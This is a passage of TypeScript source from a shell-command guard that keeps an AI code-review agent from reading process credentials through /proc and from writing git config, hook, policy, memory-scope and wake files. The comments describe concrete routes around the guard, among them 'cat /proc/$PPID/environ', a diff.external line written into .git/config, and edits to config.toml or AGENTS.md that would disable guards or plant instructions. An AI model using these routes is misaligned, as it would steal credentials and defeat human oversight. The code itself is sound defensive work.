      const literal = c.replace(/\[[^\]]*\]|[*?]/g, "").length;
      const hit = APP_SECRET_FILES.find((f) => cre.test(f) && literal * 2 >= f.length);
      if (hit !== undefined)
        return secretBlock(w, `is a glob that matches the App's secret file '${hit}'`);
    }
  }
  return { allowed: true };
}

/**
 * The file TOOLS' secret veto. pi's built-in `read` takes a `path` and
 * resolves `~` and a leading `@` itself (VERIFIED against pi 1.0.0's
 * dist/core/tools/read.js schema and path-utils.js `resolveToCwd`), so the
 * judgement the bash belt applies to a word applies to that path — plus the
 * OpenViking root-credential spellings.
 */
export function checkReadPath(path: string, ctx?: SecretPathContext): BashCheck {
  const root = checkRootCredentialSpelling(path);
  if (!root.allowed) return root;
  const c = ctx ?? processSecretContext();
  const p = path.startsWith("@") ? path.slice(1) : path;
  const w = expandShellWord(p, c.env);
  const proc = judgeProcPath(w, c.cwd);
  if (!proc.allowed) return proc;
  return judgeSecretPath(w, c);
}

/**
 * A process's environment, memory and command line — `/proc/<pid>/environ`,
 * `/mem` and `/cmdline`.
 *
 * Same family as the secret belt above, different payload: a review session's
 * parent process holds credentials in memory and argv (the engine's env, the
 * token handed over at spawn), and `cat` is a sanctioned reader, so
 * `cat /proc/$PPID/environ` would hand them to the model. Yama's
 * `ptrace_scope >= 1` blocks a sibling's `/proc/<pid>/mem` where the host sets
 * it; this rule is the same refusal everywhere, in the policy itself, and it
 * is not configurable.
 *
 * Judged on the SPELLING of every word, whatever program reads it (`cat`,
 * `head`, `xxd`, `strings`, `tr … <`, a redirect, `dd if=`): the path is
 * normalised against the cwd (a `cd /proc/self` earlier in the command moves
 * it), `/proc/<pid>/root/…` hops are followed, `$PPID`/`$$`/`$(…)` in a
 * component stand for any pid, and a glob is tried against concrete
 * candidates (`/proc/[0-9]*` + `/e*`, `/proc/self/*`). A grep/rg PATTERN is
 * exempt, as above: reviewing code that reads `/proc/self/environ` is
 * ordinary. `/proc/cpuinfo`, `/proc/self/status` and `ls /proc` stay open.
 *
 * Same reach as the secret belt: variable indirection into the directory
 * (`p=/proc/self; cat $p/environ`) is not followed.
 */
const PROC_PID = String.raw`(?:self|thread-self|\d+)`;
const PROC_SECRET_RE = new RegExp(`^/proc/${PROC_PID}(?:/task/\\d+)?/(?:environ|mem|cmdline)$`);
const PROC_ROOT_RE = new RegExp(`^/proc/${PROC_PID}(?:/task/\\d+)?/root(/.*)?$`);
const PROC_GLOB_CANDIDATES: readonly string[] = (() => {
  const out: string[] = [];
  for (const pid of ["1", "4242", "self", "thread-self"]) {
    for (const leaf of ["environ", "mem", "cmdline"]) {
      out.push(`/proc/${pid}/${leaf}`, `/proc/${pid}/task/1/${leaf}`);
    }
  }
  out.push("/proc/self/root/proc/self/environ", "/proc/1/root/proc/1/environ");
  return out;
})();

/** A dynamic part of a word (`$VAR`, `${…}`, `$$`, `$(…)`, backticks) becomes
 * a one-component wildcard, so `/proc/$PPID/environ` reads as a glob. */
function procDynamicToGlob(text: string): string {
  return text
    .replace(/\$\((?:[^()]|\([^()]*\))*\)/g, "*")
    .replace(/`[^`]*`/g, "*")
    .replace(/\$(?:\{[^}]*\}|[A-Za-z_][A-Za-z0-9_]*|[$!?#@*0-9-])/g, "*");
}

/** The command with substitutions opened up, so the words inside `$(…)` and
 * backticks are judged as words of their own. */
function procOpenSubstitutions(text: string): string {
  return text.replace(/\$\(|[`()]/g, " ");
}

function procSecretBlock(word: string): BashCheck {
  return block(
    `exec policy: '${word}' reads a process's environment, memory or command line — never sanctioned; /proc/<pid>/environ, /mem and /cmdline hold credentials and argv that a review session has no business reading`,
  );
}

/** One expanded word judged as a path. */
export function judgeProcPath(w: string, cwd: string): BashCheck {
  if (w === "") return { allowed: true };
  let abs = posix.resolve(cwd, w);
  for (let m = PROC_ROOT_RE.exec(abs); m !== null; m = PROC_ROOT_RE.exec(abs)) abs = m[1] || "/";
  if (GLOB_CHARS.test(abs)) {
    const re = globToRegex(abs);
    if (PROC_GLOB_CANDIDATES.some((c) => re.test(c))) return procSecretBlock(w);
    return { allowed: true };
  }
  return PROC_SECRET_RE.test(abs) ? procSecretBlock(w) : { allowed: true };
}

function judgeProcWord(raw: string, cwd: string): BashCheck {
  const pieces = new Set<string>();
  for (const piece of dequoteShellWord(raw).split(/[\s<>|;&()]+/)) {
    if (piece === "") continue;
    pieces.add(piece);
    for (let eq = piece.indexOf("="); eq >= 0; eq = piece.indexOf("=", eq + 1))
      pieces.add(piece.slice(eq + 1));
    if (/^-[A-Za-z]./.test(piece)) pieces.add(piece.slice(2));
    if (piece.startsWith("@")) pieces.add(piece.slice(1));
  }
  for (const piece of pieces) {
    for (const w of braceExpand(piece)) {
      const res = judgeProcPath(w, cwd);
      if (!res.allowed) return res;
    }
  }
  return { allowed: true };
}

/** Refuse a command that names `/proc/<pid>/{environ,mem,cmdline}`. */
export function checkProcSecrets(cmd: string, cwd: string = process.cwd()): BashCheck {
  for (const text of [procOpenSubstitutions(cmd), procDynamicToGlob(cmd)]) {
    let at = cwd;
    for (const segment of splitShellSegments(text)) {
      const words = rawShellWords(segment);
      const exempt = patternWordIndexes(words);
      for (let i = 0; i < words.length; i++) {
        if (exempt.has(i)) continue;
        const res = judgeProcWord(words[i]!, at);
        if (!res.allowed) return res;
      }
      const p = programIndex(words);
      if (p >= 0 && basenameOf(dequoteShellWord(words[p]!)) === "cd") {
        const target = words.slice(p + 1).find((w) => !w.startsWith("-"));
        if (target !== undefined) {
          const t = dequoteShellWord(target);
          if (!/[*?[$]/.test(t)) at = posix.resolve(at, t);
        }
      }
    }
  }
  return { allowed: true };
}

/**
 * Git's configuration and hook surface — the files that turn an ORDINARY git
 * command into arbitrary shell execution.
 *
 * This is the half of the exec boundary a command-string guard cannot reach:
 * once the decisive ingredient is A FILE THE SESSION WRITES, the command
 * itself can be innocent. VERIFIED executing, with the config-scope pin in
 * force:
 *
 *   printf '[diff]\n\texternal = <cmd>\n' >> <clone>/.git/config
 *   git diff <base> <head>            → ran <cmd>
 *
 * `git diff <base> <head>` is the single most ordinary command a review session
 * runs. There is no token in it for any blocklist to catch, and no env pin to
 * apply: git has no "ignore the local config" switch, unlike the global and
 * system scopes (`GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`/`GIT_CONFIG_NOSYSTEM`,
 * which `sessionGitConfigPins` in src/sessions.ts nails down at spawn).
 *
 * So the repo scope is closed at the WRITE boundary instead. The rule is not a
 * list of attacks — it is git's own list of the places it reads configuration
 * and executables from, which is closed and documented:
 *
 *   · anything inside a `.git` directory  — `config`, `config.worktree`,
 *     `hooks/*`, `info/attributes`, `worktrees/<n>/config.worktree`
 *   · `.gitconfig`                         — the global scope's file
 *   · `<any>/git/config`                   — the XDG scope's file
 *   · `.gitattributes`                     — the other half of `diff.*.textconv`
 *     and `filter.*.clean`; useless to an attacker without a config, but it is
 *     the same surface and a review session never writes one.
 *
 * A review session READS code (scoping rule 2); it has no legitimate reason to
 * write any of these, in the worktree or anywhere else. Its own writes — the
 * verdict file, the ledger, the review body and comment JSON — live under
 * `state/`, `verdict/` and `inject/`, none of which this touches.
 *
 * REACH, stated plainly: this binds the `write`/`edit` TOOL path and shell
 * REDIRECTION targets. It does NOT bind a write smuggled inside a quoted
 * program body (`awk 'BEGIN{print > "..."}'`) or through a sanctioned
 * script. Those remain the bash program allowlist's job, and the allowlist is
 * what keeps the set of programs that can write a file at all small.
 */
const GIT_CONFIG_NAMES = {
  directory: ".git",
  global: ".gitconfig",
  xdg: "git",
  config: "config",
  attributes: ".gitattributes",
} as const;
const GIT_CONFIG_SURFACE_RE = [
  new RegExp(`(^|/)${escapeRe(GIT_CONFIG_NAMES.directory)}(/|$)`),
  new RegExp(`(^|/)${escapeRe(GIT_CONFIG_NAMES.global)}$`),
  new RegExp(`(^|/)${GIT_CONFIG_NAMES.xdg}/${GIT_CONFIG_NAMES.config}$`),
  new RegExp(`(^|/)${escapeRe(GIT_CONFIG_NAMES.attributes)}$`),
];

/**
 * Is this path part of git's config/hook surface? Exported so both boundaries
 * — the bash redirection scan below and the write/edit tool veto in `activate`
 * — ask ONE question, and a future third caller cannot ask a narrower one.
 */
function protectedPathSpelling(path: string): string {
  return path.replace(/^['"]+|['"]+$/g, "").replace(/\/+$/, "");
}

export function isGitConfigSurface(path: string): boolean {
  // Trailing shell noise a redirection token can carry; quotes are stripped by
  // the caller, and a bare `~` expansion never changes which rule matches.
  const p = protectedPathSpelling(path);
  if (p.length === 0) return false;
  return GIT_CONFIG_SURFACE_RE.some((re) => re.test(p));
}

/**
 * This system's OWN policy-carrying surface — the analogue of
 * `isGitConfigSurface`, one level out. `isGitConfigSurface` protects the files
 * that turn an ordinary GIT command into shell execution; this protects the
 * files that decide what every layer of THIS boundary does. A review session
 * READS code (scoping rule 2); it never writes any of these, so a write to one
 * is always a reconfiguration of its own controls:
 *
 *   · `config.toml`           — the guards' and the gate's configuration. The
 *     posting scripts read `dry_run` and every `[guards]` knob out of it per
 *     invocation, and `guard_enabled` treats a knob as ON unless it is literally
 *     `false`, so ONE write turns guards 1-5 off and flips a dry-run install to
 *     live on the next sanctioned post — hard rule 1, by a redirection.
 *   · `scripts/**`            — the sanctioned posting route AND `guards.sh`,
 *     the shell mirror of the one MutationGate. Overwriting one posts around it.
 *   · `dist/**`               — the COMPILED artifacts the container actually
 *     runs, `dist/extensions/bash-guard.js` among them: overwrite the compiled
 *     guard and the boundary is off for every later round in that container.
 *   · `extensions/**`         — the guard's own source and the other pi
 *     extensions, which `deploy.sh sync` ships and the build compiles.
 *   · `prompts/**`, `agents/**`, `seeds/**` — the frozen seeds (rule 6); the
 *     `agents/` rule also covers the BUILT `state/agents/**` pass bodies pi
 *     loads each round (a `state/agents/…` path has `agents/` after a slash).
 *   · `AGENTS.override.md`, `AGENTS.md`, `AGENTS.MD`, `CLAUDE.md`, `CLAUDE.MD`
 *     — pi's project-context files. pi loads the FIRST of them it finds in the
 *     cwd into EVERY session and pass it starts there (`loadContextFileFromDir`,
 *     pi 0.87.1, unchanged at 0.99.1 and 1.0.0 — VERIFY-ON-PIN: the candidate list is pi's), and every session
 *     and pass runs in the sandbox root. One write plants instructions in every
 *     later session until the next deploy — the overseer's included.
 *   · `.pi/**`                — pi's PROJECT resource dir: `settings.json`,
 *     `extensions/`, `mcp.json` (pi 0.99+). Every project is trusted
 *     (`defaultProjectTrust = "always"`, the no-stall decision), so a file
 *     planted here loads into every later session and pass started in that
 *     root: an extension runs as code, a `mcp.json` launches server processes,
 *     and a `+builtin:mcp` in project settings re-enables what the global
 *     settings switch off (src/pibuiltins.ts) — project entries override the
 *     user's. As a SHAPE this also covers `<pi home>/.pi/agent/…`, the
 *     session's own global pi settings and login; a session writes neither.
 *
 * The list is OURS, closed and documented (docs/exec-boundary.md), not a list
 * of attacks. `POLICY_SURFACE_FILES` / `POLICY_SURFACE_DIRS` — top-level names
 * RELATIVE TO THE SANDBOX ROOT — are the ONE definition three consumers read:
 * the write/edit tool veto and the shell-redirection scan (both through
 * `isPolicySurface`, as a path SHAPE: the name after any prefix, because the
 * guard does not know the session's cwd) and layer 4's round-boundary
 * integrity check (`policySurfaceWatchPaths` in src/execboundary.ts, as
 * concrete paths under the root — the one layer that also sees the write no
 * command string can show, `T=config.toml; cat p > $T`). Being a SHAPE, the
 * write veto also refuses `scripts/…`, `dist/…` etc. inside the REVIEWED
 * repo's worktree; a reviewer never writes there either (scoping rule 2).
 * `state/agents/**` — the BUILT pass bodies — is refused at the write boundary
 * through the `agents/` shape but deliberately NOT watched by layer 4: the
 * daemon itself rebuilds it mid-round on feedback ingest and the day change.
 */
export const POLICY_SURFACE_FILES = [
  "config.toml",
  "AGENTS.override.md",
  "AGENTS.md",
  "AGENTS.MD",
  "CLAUDE.md",
  "CLAUDE.MD",
] as const;
/** Companion-owned policy intents change normally during a round, so they
 * have the write veto without a round hash, like built state/agents bodies. */
const DYNAMIC_POLICY_FILES = ["qcr-profile-write.json", ".qcr-profile-write.json.tmp"] as const;
export const POLICY_SURFACE_DIRS = [
  "scripts",
  "dist",
  "extensions",
  "prompts",
  "agents",
  "seeds",
  ".pi",
] as const;

function escapeRe(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
const POLICY_SURFACE_RE = [
  new RegExp(
    `(^|/)(?:${[...POLICY_SURFACE_FILES, ...DYNAMIC_POLICY_FILES].map(escapeRe).join("|")})$`,
  ),
  new RegExp(`(^|/)(?:${POLICY_SURFACE_DIRS.map(escapeRe).join("|")})/.+`),
];

/** Is this path part of this system's own policy surface? Exported so both
 * boundaries ask ONE question — see `POLICY_SURFACE_RE`. */
export function isPolicySurface(path: string): boolean {
  const p = protectedPathSpelling(path);
  if (p.length === 0) return false;
  return POLICY_SURFACE_RE.some((re) => re.test(p));
}

/**
 * The MEMORY-SCOPE files — what decides how far a PR session's OWN memory
 * recall may reach. The daemon publishes both into the session's pi home,
 * beside its `ovcli.conf` (src/memory/ovsession.ts), and the vendored
 * OpenViking extension reads them on every prompt:
 *
 *   · `recall-hints/<session>.json` — the RECALL HINT (`ovRecallHintPathIn`):
 *     the round's query and the memory AREAS the session's recall and its
 *     memory tools may reach (`experiences/` alone — vendored patches
 *     0008/0009/0011). One write of `{"areas":["finding-cases","events"]}`
 *     would widen the session's own scope to the finding cases and the
 *     feedback events no round may read, until the daemon writes the hint
 *     again at the next round.
 *   · `retired-uris.json` — the RETIRED list (`ovRetiredPathIn`) the recall
 *     excludes. Emptied, it brings retired entries back into every prompt's
 *     recall.
 *
 * A review session READS memory and never writes either file; the daemon does,
 * whole and atomically, every round. Matched as a SHAPE like the policy
 * surface — the distinctive name under ANY prefix, because the guard does not
 * know the pi home (and a `cd` into `.openviking/` drops that part of the
 * spelling) — and NOT watched by layer 4: the daemon rewrites the hint at
 * every round's dispatch, so a round-boundary hash would read its own work as
 * a change (the `state/agents/**` reasoning). The write veto is the
 * protection these files have.
 */
export const MEMORY_SCOPE_SURFACE = ["recall-hints/", "retired-uris.json"] as const;
const MEMORY_SCOPE_SURFACE_RE = [
  /(^|\/)recall-hints(\/|$)/, // the hint dir, any file in it (its `.tmp-<pid>` too)
  /(^|\/)retired-uris\.json(\.tmp-[^/]*)?$/, // the retired list, and its atomic-write temp
];

/** Is this path one of the memory-scope files a session's recall reads?
 * Exported so both write boundaries ask ONE question. */
export function isMemoryScopeSurface(path: string): boolean {
  const p = protectedPathSpelling(path);
  if (p.length === 0) return false;
  return MEMORY_SCOPE_SURFACE_RE.some((re) => re.test(p));
}

/**
 * The WAKE-DELIVERY files — the daemon's inject dirs
 * (`<root>/inject/<session>/`, `PiSessionManager.injectDir`) and the inject
 * bridge's record of what pi accepted. The bridge takes pending wakes in name
 * order and moves each one pi accepts into `.done/`; the daemon reads that
 * move as "this turn is now running" — above all for the overseer, whose
 * Slack command rights are the served turn's (`src/slack/origin.ts`). One
 * planted `.done/<queued wake>.md`, or a queued wake emptied in place (the
 * bridge moves an empty file to `.done/` without serving it), would hand a
 * running turn the rights of one still queued; a file dropped into another
 * session's inject dir is a prompt in that session.
 *
 * A session never writes any of them; the daemon writes the wakes and the
 * bridge moves them. Matched as a SHAPE: the `inject` dir and anything in it
 * under any prefix, a `.done` dir and anything in it (a `cd` into the inject
 * dir drops the `inject/` part), and the wake file's own name
 * (`<ISO stamp>-<seq>[--cmd-<id>].md`, its atomic-write temp included — a `cd`
 * into the session's dir drops every directory). Not watched by layer 4: the
 * daemon and the bridge rewrite these dirs all the time, so a round-boundary
 * hash would report their own work. The write veto is the protection, and a
 * session has no program that moves or removes a file.
 */
export const DELIVERY_SURFACE = ["inject/", ".done/", "<wake file>.md"] as const;
const DELIVERY_SURFACE_RE = [
  /(^|\/)inject(\/|$)/, // every session's inject dir, any file in it
  /(^|\/)\.done(\/|$)/, // the bridge's accepted wakes
  /(^|\/)\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}Z-\d{4,}(--cmd-[^/]*)?\.md(\.tmp-[^/]*)?$/, // a wake file
];

/** Is this path one of the wake-delivery files? Exported so both write
 * boundaries ask ONE question. */
export function isDeliverySurface(path: string): boolean {
  const p = protectedPathSpelling(path);
  if (p.length === 0) return false;
  return DELIVERY_SURFACE_RE.some((re) => re.test(p));
}

/** The full set a session may not write, from ONE definition: git's own config
 * and hook surface, this system's policy surface, the memory-scope files its
 * own recall reads and the wake-delivery files. Both the write/edit tool veto
 * (`checkWritePath`) and the shell-redirection / sed scan
 * (`checkProtectedWrites`) refuse exactly this, so they cannot drift. */
export function isProtectedWriteTarget(path: string): boolean {
  return (
    isGitConfigSurface(path) ||
    isPolicySurface(path) ||
    isMemoryScopeSurface(path) ||
    isDeliverySurface(path)
  );
}

/** Veto reason for a wake-delivery write target. */
function deliverySurfaceWriteBlock(path: string): BashCheck {
  return block(
    `exec policy: '${path}' is a wake-delivery file (an inject dir, the bridge's .done/ or a wake file) — the daemon writes wakes there and reads their delivery to decide whose turn is running. A session never writes them.`,
  );
}

/** Veto reason for a memory-scope write target. */
function memoryScopeWriteBlock(path: string): BashCheck {
  return block(
    `exec policy: '${path}' is a memory-scope file the daemon writes for this session's recall (the recall hint or the retired list) — writing it would widen what this session's own memory recall may reach. The reviewer reads memory; it never sets its own scope.`,
  );
}

/** Veto reason for a policy-surface write target. */
function policySurfaceWriteBlock(path: string): BashCheck {
  return block(
    `exec policy: '${path}' is part of this system's own policy surface (config.toml, scripts/, dist/, extensions/, prompts/agents/seeds, .pi/) — writing it reconfigures the posting guards, the mutation gate or the compiled boundary itself. The reviewer reads code; it never edits its own controls.`,
  );
}

/** Whichever refusal fits the target — git's config surface and the memory
 * scope keep their own, more specific messages. */
function protectedWriteBlock(path: string): BashCheck {
  if (isGitConfigSurface(path)) return gitConfigWriteBlock(path);
  if (isMemoryScopeSurface(path)) return memoryScopeWriteBlock(path);
  if (isDeliverySurface(path)) return deliverySurfaceWriteBlock(path);
  return policySurfaceWriteBlock(path);
}

function gitConfigWriteBlock(path: string): BashCheck {
  return block(
    `exec policy: '${path}' is part of git's configuration surface — writing it makes an ORDINARY git command (a plain 'git diff') execute a program of the writer's choosing. The reviewer reads code; it never configures git.`,
  );
}

/**
 * A redirection target is EXPANDED by bash before the file is opened:
 * pathname expansion (`*`, `?`, `[…]`) turns a pattern matching one existing
 * file into that file, and a sequence brace with one element (`{s..s}`) is one
 * word — `> recall-hint?/pr-1.json`, `> retired-uri[s].json`,
 * `> retired-uris.js*` and `> recall-hint{s..s}/…` each overwrite the real
 * file (VERIFIED), while a literal name check sees none of them. So a target
 * carrying either syntax is judged by every protected NAME it could expand
 * onto: each brace group is widened to `*`, each pattern component is replaced
 * by each protected component name it matches (`globToRegex`), and every
 * resulting path is put to the same `isProtectedWriteTarget` — for every
 * set, git's config surface (`.gi?/config`) and the policy surface
 * (`config.tom?`) included. A pattern no protected name can satisfy
 * (`> /tmp/out-*.txt`) is left alone.
 */
const BRACE_GROUP_RE = /\{[^{}]*(?:,|\.\.)[^{}]*\}/g;
/** The component names the protected sets are spelled with: what a pattern
 * component is tried against. One representative temp name stands for the
 * retired list's `.tmp-<pid>`; wake patterns are judged as a filename
 * family by possibleWakePattern below. */
const PROTECTED_COMPONENT_NAMES: readonly string[] = [
  ...Object.values(GIT_CONFIG_NAMES),
  ...POLICY_SURFACE_FILES,
  ...DYNAMIC_POLICY_FILES,
  ...POLICY_SURFACE_DIRS,
  ...MEMORY_SCOPE_SURFACE.map((p) => p.replace(/\/$/, "")),
  `${MEMORY_SCOPE_SURFACE[1]}.tmp-1`,
  ...DELIVERY_SURFACE.filter((p) => p.endsWith("/")).map((p) => p.slice(0, -1)),
];
/** Past this many candidate paths a pattern is refused without enumerating
 * the rest — a target that broad is no reviewer's write. */
const PATTERN_CANDIDATE_CAP = 512;

/** A conservative intersection with wake filenames. Before the first glob
 * metacharacter the literal prefix must fit a timestamp/sequence; after an
 * optional command marker any suffix may be part of its id. The remaining
 * pattern is deliberately unconstrained, so uncertainty refuses a write. */
function possibleWakePattern(part: string): boolean {
  if (!GLOB_CHARS.test(part)) return false;
  const prefix = part.split(/[*?[]/, 1)[0]!;
  const stem = "0000-00-00T00-00-00-000Z-0000";
  for (let i = 0; i < Math.min(prefix.length, stem.length); i++) {
    if (stem[i] === "0" ? !/[0-9]/.test(prefix[i]!) : prefix[i] !== stem[i]) return false;
  }
  if (prefix.length <= stem.length) return true;
  const rest = prefix.slice(stem.length).replace(/^\d*/, "");
  if ("--cmd-".startsWith(rest) || rest.startsWith("--cmd-")) return true;
  if (".md".startsWith(rest)) return true;
  if (!rest.startsWith(".md")) return false;
  const tail = rest.slice(3);
  return ".tmp-".startsWith(tail) || tail.startsWith(".tmp-");
}

/** The protected path a redirection-target PATTERN can expand onto, or null
 * (also null for a target with no pattern syntax at all). */
export function protectedPatternHit(target: string): string | null {
  const widened = target.replace(BRACE_GROUP_RE, "*");
  if (!GLOB_CHARS.test(widened)) return null;
  let paths = [""];
  const parts = widened.split("/");
  if (possibleWakePattern(parts[parts.length - 1]!)) return target;
  for (const [k, part] of parts.entries()) {
    const options = [part];
    if (GLOB_CHARS.test(part)) {
      const re = globToRegex(part);
      for (const name of PROTECTED_COMPONENT_NAMES) if (re.test(name)) options.push(name);
    }
    const next: string[] = [];
    for (const p of paths) for (const o of options) next.push(k === 0 ? o : `${p}/${o}`);
    if (next.length > PATTERN_CANDIDATE_CAP) return target;
    paths = next;
  }
  return paths.find((p) => isProtectedWriteTarget(p)) ?? null;
}

/** One redirection target (dequoted), judged literally and as a pattern. */
function judgeRedirectTarget(target: string): BashCheck {
  const pattern = target.replace(BRACE_GROUP_RE, "*").split("/").at(-1)!;
  if (possibleWakePattern(pattern)) return deliverySurfaceWriteBlock(target);
  if (isProtectedWriteTarget(target)) return protectedWriteBlock(target);
  const hit = protectedPatternHit(target);
  if (hit === null) return { allowed: true };
  if (hit === target)
    return block(
      `exec policy: '${target}' is a pattern too broad to judge — bash expands it before it opens the file, and it may name a protected file. Name the file you write.`,
    );
  const literal = protectedWriteBlock(hit);
  return block(
    (literal.reason ?? "").replace(
      `'${hit}'`,
      `'${target}' (a pattern bash expands before it opens the file — it can name '${hit}')`,
    ),
  );
}

/** Operator token shapes AFTER `normalizeRedirections`: `>`/`>>`, optionally
 * fd-prefixed, bare or with the target attached. */
const REDIRECT_OP_RE = /^\d*>>?$/;
const REDIRECT_OP_ATTACHED_RE = /^\d*>>?(.+)$/;

/** A shell word with its quoting removed. bash opens `con"fig".toml`,
 * `config\.toml` and `config.toml` as the SAME file, so a write target is
 * judged by the name bash would open, not by its spelling (VERIFIED writing). */
function dequote(word: string): string {
  return word.replace(/["'\\]/g, "");
}

/** Whether `text` opens ANSI-C (`$'…'`) or locale (`$"…"`) quoting — forms
 * `dequote` does not decode. Only a `$` OUTSIDE quotes opens one: inside
 * single or double quotes `$'`/`$"` is literal (`--jq 'test("x$")'`).
 * Exported because `src/usage.ts` audits the same forms. */
export function opensUnmodelledQuoting(text: string): boolean {
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (quote === "'") {
      if (c === "'") quote = null;
      continue;
    }
    if (c === "\\") {
      i++;
      continue;
    }
    if (quote === '"') {
      if (c === '"') quote = null;
      continue;
    }
    if (c === "$" && (text[i + 1] === "'" || text[i + 1] === '"')) return true;
    if (c === "'" || c === '"') quote = c;
  }
  return false;
}

/**
 * Every spelling of an OUTPUT redirection, rewritten onto the canonical `>` /
 * `>>` before anything else reads the command, so the write-target scan and
 * the segment splitter both see one form. Exported because `src/usage.ts`
 * borrows it the way it borrows `splitShellSegments` — the TOKENISER, not the
 * policy. Bash has more of these than `>`:
 *   · fd-dups (`2>&1`, `>&2`, `1>&-`) name no file and are dropped;
 *   · `>&file`, `&>file`, `&>>file` write stdout+stderr to a FILE;
 *   · `{v}>file` opens the file on a descriptor bash picks and stores in `v`;
 *   · `<>file` opens read-write — `printf x 1<>config.toml` OVERWRITES it;
 *   · `>|file` overrides noclobber.
 * All five VERIFIED writing the target; a scan that knew only `>` and `>>`
 * would miss each.
 */
export function normalizeRedirections(cmd: string): string {
  return cmd
    .replace(/(?:\{[A-Za-z_][A-Za-z0-9_]*\}|\d*)>&\s*(?:\d+|-)(?=$|[\s;&|)])/g, " ") // fd-dup: names no file
    .replace(/(?:\{[A-Za-z_][A-Za-z0-9_]*\}|\d*)>&/g, ">") // >&file
    .replace(/&>/g, ">") // &>file, &>>file
    .replace(/\{[A-Za-z_][A-Za-z0-9_]*\}(>>?|<>)/g, "$1") // {v}>file
    .replace(/(\d*)<>/g, "$1>") // read-write open
    .replace(/(>>?)\|/g, "$1"); // noclobber override
}

/**
 * Shell redirections and `sed -i` whose target is a PROTECTED write surface —
 * git's config/hook surface, this system's own policy surface (config.toml,
 * scripts/, dist/, extensions/, prompts/agents/seeds, .pi/, the pi context
 * files) or the memory-scope files a session's recall reads.
 *
 * The segment splitter deliberately skips redirection remnants when hunting for
 * the program token, so `cat evil > config.toml` and `printf '…' > .git/config`
 * both vet as an allowlisted program (`cat`/`printf`) and pass the per-segment
 * check. That is right for finding the PROGRAM and wrong for finding the TARGET,
 * so the target is asked about separately, over the raw command — the same shape
 * `checkSecretPaths` already uses for the root-credential paths, and for the
 * same reason: the path, not the program, is what distinguishes it. This is one
 * of the TWO boundaries `isProtectedWriteTarget` binds; the other is the
 * write/edit tool veto in `checkWritePath`, and both read the same predicate so
 * they cannot drift apart.
 *
 * `tee`, `cp`, `mv` and `dd` are the other ways to write a named file, and they
 * need no case here: none is on `ALLOWED`, so `checkProgram` refuses them
 * outright whatever their target. `sort -o`, `find -fprintf` and `awk` are
 * refused whole (reader-mode rules / off the allowlist), so they cannot reach a
 * target either. `sed -i` is the one allowlisted writer that names its target as
 * a plain argument rather than after a `>`, so it is covered by this scan. The
 * redirection itself has more spellings than `>`/`>>` — see
 * `normalizeRedirections`, which folds all of them onto those two first.
 */
export function checkProtectedWrites(cmd: string): BashCheck {
  const tokens = normalizeRedirections(cmd)
    .split(/\s+/)
    .filter((t) => t.length > 0);
  // `sed -i` / `sed -i.bak` / `sed -ne … -i` — the one allowlisted program that
  // rewrites a file named as a plain argument. When it is in play EVERY token
  // is a candidate target; being over-broad here costs a refusal on a command
  // that also mentions a protected path, which no legitimate read does.
  const sedInPlace =
    tokens.some((t) => /(^|\/)sed$/.test(t)) &&
    tokens.some(
      (t) =>
        /^-[a-zA-Z]*i([a-zA-Z]*)?([.'"].*)?$/.test(t) ||
        t === "--in-place" ||
        t.startsWith("--in-place="),
    );
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i]!;
    // `> path`, `>> path` — target is the next token. Tested BEFORE the
    // attached form, which would otherwise swallow a bare `>>` by reading its
    // second `>` as the target.
    if (REDIRECT_OP_RE.test(t)) {
      const target = tokens[i + 1];
      if (target !== undefined && isProtectedWriteTarget(dequote(target)))
        return protectedWriteBlock(dequote(target));
      continue;
    }
    // `>path`, `>>path`, `2>path` — target attached to the operator.
    const attached = REDIRECT_OP_ATTACHED_RE.exec(t);
    if (attached) {
      const target = dequote(attached[1]!);
      if (isProtectedWriteTarget(target)) return protectedWriteBlock(target);
      continue;
    }
    if (sedInPlace && isProtectedWriteTarget(dequote(t))) return protectedWriteBlock(dequote(t));
  }
  // The whitespace scan above is quote-blind on purpose (over-broad: a quoted
  // `> config.toml` inside a pattern is refused too) and therefore cannot see
  // two things bash does: an operator GLUED to the word before it
  // (`printf x>retired-uris.json` — `x>` is no token it knows), and
  // a target bash EXPANDS (`> retired-uri[s].json`). Both are judged here,
  // over the redirections bash would actually perform — `redirectTargets`
  // reads quotes, so a `>` inside a quoted grep pattern is no write and its
  // `.*` is never mistaken for a pattern target.
  for (const target of redirectTargets(normalizeRedirections(cmd))) {
    const res = judgeRedirectTarget(target);
    if (!res.allowed) return res;
  }
  return { allowed: true };
}

/**
 * The target of every UNQUOTED output redirection in a command (after
 * `normalizeRedirections` has folded the spellings onto `>`/`>>`), each with
 * its quoting removed as bash removes it — `$'…'` and `$"…"` included. A
 * `>` inside single or double quotes, or escaped, is text, not an operator;
 * one glued to the word before it (`x>file`) is an operator. Process
 * substitution (`>(…)`) names no file and yields nothing. Exported because
 * `src/usage.ts` borrows it the way it borrows `splitShellSegments` — the
 * TOKENISER, not the policy.
 */
export function redirectTargets(cmd: string): string[] {
  const out: string[] = [];
  let q: '"' | "'" | null = null;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i]!;
    if (q === "'") {
      if (c === "'") q = null;
      continue;
    }
    if (c === "\\") {
      i++;
      continue;
    }
    if (q === '"') {
      if (c === '"') q = null;
      continue;
    }
    if (c === "'" || c === '"') {
      q = c;
      continue;
    }
    if (c !== ">") continue;
    let j = i + 1;
    if (cmd[j] === ">") j++;
    while (j < cmd.length && (cmd[j] === " " || cmd[j] === "\t")) j++;
    // One shell word: up to the first unquoted blank or metacharacter.
    const start = j;
    let wq: '"' | "'" | null = null;
    for (; j < cmd.length; j++) {
      const d = cmd[j]!;
      if (wq !== null) {
        if (d === wq) wq = null;
        else if (wq === '"' && d === "\\") j++;
        continue;
      }
      if (d === "\\") {
        j++;
        continue;
      }
      if (d === "'" || d === '"') {
        wq = d;
        continue;
      }
      if (/[\s;&|()<>]/.test(d)) break;
    }
    const raw = cmd.slice(start, Math.min(j, cmd.length));
    if (raw.length > 0) out.push(dequoteShellWord(raw.replace(/\$"/g, '"')));
    i = j - 1;
  }
  return out;
}

/** Pure policy check over a full bash command string: split into segments
 * (quote-aware) and vet each segment's first program token. */
export function checkBashCommand(
  cmd: string,
  depth = 0,
  cwd: string | null = process.cwd(),
  policy: GuardPolicy = ambientPolicy(),
): BashCheck {
